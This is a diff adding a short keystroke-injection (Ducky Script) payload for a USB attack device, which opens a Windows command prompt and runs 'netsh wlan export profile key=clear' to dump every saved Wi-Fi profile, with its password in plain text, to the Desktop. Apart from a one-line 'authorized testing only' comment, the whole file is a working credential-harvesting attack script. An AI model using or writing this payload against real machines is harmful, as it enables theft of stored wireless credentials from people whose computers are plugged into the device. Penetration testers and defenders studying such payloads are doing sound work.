@@ -1,0 +1,10 @@
+REM Windows saved Wi-Fi profiles (including keys) exported to the Desktop.
+REM Authorized testing only — this reveals stored wireless credentials.
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING netsh wlan export profile key=clear folder="%USERPROFILE%\Desktop"
+ENTER
